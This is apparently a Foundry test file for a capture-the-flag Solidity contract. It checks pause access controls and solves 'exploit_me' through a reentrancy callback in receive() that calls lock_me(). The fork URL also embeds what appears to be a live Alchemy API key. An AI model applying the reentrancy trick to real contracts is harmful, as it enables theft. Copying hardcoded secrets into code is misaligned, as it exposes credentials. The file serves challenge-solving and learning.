// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.24;

import {Test, console, console2} from "forge-std/Test.sol";
import {Challenge} from "../src/Challenge.sol";

contract ExploitTest is Test {
    Challenge challenge;
    address owner = makeAddr("owner");
    address user = makeAddr("user");

    function setUp() public {
        vm.createSelectFork("https://eth-sepolia.g.alchemy.com/v2/o8P5Uj9ObttRRtuaWg-44jrSNnB1nX_9");
        vm.prank(owner);
        challenge = new Challenge();

        assertEq(challenge.owner(), owner);
    }

    function test_pause() public {
        vm.prank(owner);
        challenge.pause(true);
        assertEq(challenge.isPause(), true);
    }

    function test_only_owner_can_pause() public{
        vm.prank(user);
        vm.expectRevert();
        challenge.pause(true);
    }

    function test_exploit_me_reverts_if_paused() public {
        test_pause();
        
        vm.prank(user);
        vm.expectRevert();
        challenge.exploit_me("moi");
    }

    function test_exploit_me_reverts_if_not_locked() public {
        vm.prank(user);
        vm.expectRevert();
        challenge.exploit_me("moi");
    }

    function test_exploit_me_can_be_reentered() public{
        challenge.exploit_me("moi");

        assertEq(challenge.lock(), true);
        assertEq(challenge.HasInteracted(address(this)), true);
        assertEq(challenge.Names(msg.sender), "moi");
        assertEq(challenge.winners(0), msg.sender);
    }

    function test_get_winners() public{
        test_exploit_me_can_be_reentered();
        string[] memory winnersNames = challenge.getAllwiners();
       assertEq(winnersNames[0], "moi");
    }

    function test_get_winners_onchain() public view{
        string[] memory winnersNames = challenge.getAllwiners();
        for(uint i; i < winnersNames.length; i++){
            console2.log("Winner ", i + 1 , winnersNames[i]);
        }
    }
    receive () external payable {
        challenge.lock_me();
    }
}
